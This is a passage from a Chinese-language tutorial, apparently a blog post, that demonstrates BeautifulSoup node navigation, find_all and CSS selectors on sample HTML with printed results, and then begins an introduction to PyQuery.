three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(soup.p.string)</code></pre><p><strong>运行结果：</strong></p><pre><code>The Dormouse&apos;s story</code></pre><h4 id="4-嵌套选择"><a href="#4-嵌套选择" class="headerlink" title="(4)嵌套选择"></a><strong>(4)嵌套选择</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(soup.head.title.string)</code></pre><p><strong>运行结果：</strong></p><pre><code>The Dormouse&apos;s story</code></pre><h4 id="5-获取子孙节点"><a href="#5-获取子孙节点" class="headerlink" title="(5)获取子孙节点"></a><strong>(5)获取子孙节点</strong></h4><h5 id="1-contents"><a href="#1-contents" class="headerlink" title="1.contents"></a><strong>1.contents</strong></h5><p>这种方法是以列表形式返回标签的子节点</p><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(soup.p.contents)</code></pre><p><strong>运行结果：</strong></p><pre><code>[&apos;\n            Once upon a time there were three little sisters; and their names were\n            &apos;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;/a&gt;, &apos;\n&apos;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;, &apos; \n            and\n            &apos;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;, &apos;\n            and they lived at the bottom of a well.\n        &apos;]</code></pre><h5 id="2-children"><a href="#2-children" class="headerlink" title="2.children"></a><strong>2.children</strong></h5><p>这种方法返回的是一个子节点的迭代器形式</p><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(soup.p.children)for i, child in enumerate(soup.p.children):    print(i, child)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;list_iterator object at 0x1064f7dd8&gt;0             Once upon a time there were three little sisters; and their names were1 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;/a&gt;2 3 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;4              and5 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;6             and they lived at the bottom of a well.</code></pre><h5 id="3-descendants"><a href="#3-descendants" class="headerlink" title="3.descendants"></a><strong>3.descendants</strong></h5><p>返回子孙节点，其实和上面 children 的不同在于这个方法会再次强调一下孙子节点</p><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(soup.p.descendants)for i, child in enumerate(soup.p.descendants):    print(i, child)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;generator object descendants at 0x10650e678&gt;0             Once upon a time there were three little sisters; and their names were1 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;/a&gt;2 3 &lt;span&gt;Elsie&lt;/span&gt;4 Elsie5 6 7 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;8 Lacie9              and10 &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;11 Tillie12             and they lived at the bottom of a well.</code></pre><h4 id="6-父节点和祖先节点"><a href="#6-父节点和祖先节点" class="headerlink" title="(6)父节点和祖先节点"></a><strong>(6)父节点和祖先节点</strong></h4><h5 id="1-parent"><a href="#1-parent" class="headerlink" title="1.parent"></a><strong>1.parent</strong></h5><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(soup.a.parent)</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;&lt;span&gt;Elsie&lt;/span&gt;&lt;/a&gt;&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt; and they lived at the bottom of a well.&lt;/p&gt;</code></pre><h5 id="2-parents"><a href="#2-parents" class="headerlink" title="2.parents"></a><strong>2.parents</strong></h5><p>以列表的形式输出所有的祖先节点</p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(list(enumerate(soup.a.parents)))</code></pre><h4 id="7-兄弟节点"><a href="#7-兄弟节点" class="headerlink" title="(7)兄弟节点"></a><strong>(7)兄弟节点</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &quot;&quot;&quot;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;The Dormouse&apos;s story&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;p class=&quot;story&quot;&gt;            Once upon a time there were three little sisters; and their names were            &lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;                &lt;span&gt;Elsie&lt;/span&gt;            &lt;/a&gt;            &lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;             and            &lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;            and they lived at the bottom of a well.        &lt;/p&gt;        &lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(list(enumerate(soup.a.next_siblings)))print(list(enumerate(soup.a.previous_siblings)))</code></pre><p><strong>运行结果：</strong></p><pre><code>[(0, &apos;\n&apos;), (1, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;), (2, &apos; \n            and\n            &apos;), (3, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;), (4, &apos;\n            and they lived at the bottom of a well.\n        &apos;)][(0, &apos;\n            Once upon a time there were three little sisters; and their names were\n            &apos;)]</code></pre><h3 id="5-标准选择器"><a href="#5-标准选择器" class="headerlink" title="5.标准选择器"></a><strong>5.标准选择器</strong></h3><p>上面我们讲述的标签选择器虽然选择速度快，但是选择的内容也是比较笼统的，在现实中很难满足我们的需求，于是我们就需要更强大的选择器帮助我们去实现</p><pre><code>find_all( name , attrs , recursive , text , **kwargs )</code></pre><p>可根据标签名、属性、内容查找文档</p><h4 id="1-name"><a href="#1-name" class="headerlink" title="(1) name"></a><strong>(1) name</strong></h4><p><strong>实例代码一：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&apos;lxml&apos;)soup.find_all(&apos;ul&apos;)</code></pre><p><strong>运行结果：</strong></p><pre><code>[&lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt; &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt; &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt; &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt; &lt;/ul&gt;, &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt; &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt; &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt; &lt;/ul&gt;]</code></pre><p>如果我们还想获取更里面的标签，我们可以再次对获取到的 ul 标签使用 find_all()</p><p><strong>实例代码二：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&apos;lxml&apos;)for i in soup.find_all(&apos;ul&apos;):    print(i.find_all(&apos;li&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>[&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;][&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;]</code></pre><h4 id="2-attrs"><a href="#2-attrs" class="headerlink" title="(2)attrs"></a><strong>(2)attrs</strong></h4><p>传入想要定位的属性键值对，就能成功定位</p><p><strong>实例代码一：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&apos;lxml&apos;)print(soup.find_all(attrs={&apos;id&apos;:&apos;list-1&apos;}))print(soup.find_all(attrs={&apos;name&apos;:&apos;elements&apos;}))</code></pre><p><strong>运行结果：</strong></p><pre><code>[&lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;&lt;/ul&gt;][&lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;&lt;/ul&gt;]</code></pre><p>或者，如果 你觉得这种方式比较复杂的话我们还可以使用更加简单的直接使用等于号链接属性和值作为参数传入来定位</p><p><strong>实例代码二：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&apos;lxml&apos;)print(soup.find_all(id = &apos;list-1&apos;))print(soup.find_all(class_ = &apos;panel-heading&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>[&lt;ul class=&quot;list&quot; id=&quot;list-1&quot; name=&quot;elements&quot;&gt;&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;&lt;/ul&gt;][&lt;div class=&quot;panel-heading&quot;&gt;&lt;h4&gt;Hello&lt;/h4&gt;&lt;/div&gt;]</code></pre><blockquote><p><strong>注意：</strong></p><p>Class 是 python 中的关键字，因此我们在写属性的时候不能直接写 classs，否则会引起歧义，所以我们改成了 class_</p></blockquote><h4 id="3-text"><a href="#3-text" class="headerlink" title="(3)text"></a><strong>(3)text</strong></h4><p><strong>实例代码：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)print(soup.find_all(text=&apos;Foo&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>[&apos;Foo&apos;, &apos;Foo&apos;]</code></pre><h4 id="4-其他"><a href="#4-其他" class="headerlink" title="(4)其他"></a><strong>(4)其他</strong></h4><p>find( name , attrs , recursive , text , **kwargs )<br>find_all() 返回所有元素，而find()返回单一元素</p><p>find_parents() find_parent()<br>find_parents()返回所有祖先节点，find_parent()返回直接父节点。</p><p>find_next_siblings() find_next_sibling()<br>find_next_siblings()返回后面所有兄弟节点，find_next_sibling()返回后面第一个兄弟节点。</p><p>find_previous_siblings() find_previous_sibling()<br>find_previous_siblings()返回前面所有兄弟节点，find_previous_sibling()返回前面第一个兄弟节点。</p><p>find_all_next() find_next()<br>find_all_next()返回节点后所有符合条件的节点, find_next()返回第一个符合条件的节点</p><p>find_all_previous() 和 find_previous()<br>find_all_previous()返回节点后所有符合条件的节点, find_previous()返回第一个符合条件的节点</p><h3 id="6-CSS选择器"><a href="#6-CSS选择器" class="headerlink" title="6.CSS选择器"></a><strong>6.CSS选择器</strong></h3><h4 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="(1)基本使用"></a><strong>(1)基本使用</strong></h4><p>通过select()直接传入CSS选择器即可完成选择</p><p><strong>实例代码一：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html,&apos;lxml&apos;)print(soup.select(&apos;.panel-heading&apos;))print(soup.select(&apos;#list-1&apos;))print(soup.select(&apos;li&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>[&lt;div class=&quot;panel-heading&quot;&gt;&lt;h4&gt;Hello&lt;/h4&gt;&lt;/div&gt;][&lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;&lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;&lt;/ul&gt;][&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;]</code></pre><p><strong>实例代码二：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)for ul in soup.select(&apos;ul&apos;):    print(ul.select(&apos;li&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>[&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;][&lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;, &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;]</code></pre><h4 id="2-获取属性-1"><a href="#2-获取属性-1" class="headerlink" title="(2)获取属性"></a><strong>(2)获取属性</strong></h4><p><strong>实例代码：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)for ul in soup.select(&apos;ul&apos;):    print(ul[&apos;id&apos;])    print(ul.attrs[&apos;id&apos;])</code></pre><p><strong>运行结果：</strong></p><pre><code>list-1list-1list-2list-2</code></pre><h4 id="3-获取内容-1"><a href="#3-获取内容-1" class="headerlink" title="(3)获取内容"></a><strong>(3)获取内容</strong></h4><p><strong>实例代码：</strong></p><pre><code>html=&apos;&apos;&apos;&lt;div class=&quot;panel&quot;&gt;    &lt;div class=&quot;panel-heading&quot;&gt;        &lt;h4&gt;Hello&lt;/h4&gt;    &lt;/div&gt;    &lt;div class=&quot;panel-body&quot;&gt;        &lt;ul class=&quot;list&quot; id=&quot;list-1&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Jay&lt;/li&gt;        &lt;/ul&gt;        &lt;ul class=&quot;list list-small&quot; id=&quot;list-2&quot;&gt;            &lt;li class=&quot;element&quot;&gt;Foo&lt;/li&gt;            &lt;li class=&quot;element&quot;&gt;Bar&lt;/li&gt;        &lt;/ul&gt;    &lt;/div&gt;&lt;/div&gt;&apos;&apos;&apos;from bs4 import BeautifulSoupsoup = BeautifulSoup(html, &apos;lxml&apos;)for li in soup.select(&apos;li&apos;):    print(li.get_text())</code></pre><p><strong>运行结果：</strong></p><pre><code>FooBarJayFooBar</code></pre><h2 id="0X07-PyQuery"><a href="#0X07-PyQuery" class="headerlink" title="0X07 PyQuery"></a><strong>0X07 PyQuery</strong></h2><p>PyQuery 是另一个比较强大的网页解析库，语法完全从 jQuery 迁移过来，所以对于熟悉 JQuery 的开发人员来说是非常好的选择</p><h3 id="1-初始化"><a href="#1-初始化" class="headerlink" title="1.初始化"></a><strong>1.初始化</strong></h3><h4 id="1-字符串初始化"><a href="#1-字符串初始化" class="headerlink" title="(1)字符串初始化"></a><strong>(1)字符串初始化</strong></h4><p><strong>实例代码：</strong></p><pre><code>html = &apos;&apos;&apos;&lt;div&gt;    &lt;ul&gt;         &lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0 active&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;&lt;span class=&quot;bold&quot;&gt;third item&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-1 active&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt;&lt;/li&gt;     &lt;/ul&gt; &lt;/div&gt;&apos;&apos;&apos;from pyquery import PyQuery as pqdoc = pq(html)print(doc(&apos;li&apos;))</code></pre><p><strong>运行结果：</strong></p><pre><code>&lt;li class=&quot;item-0&quot;&gt;first item&lt;/li&gt;&lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li 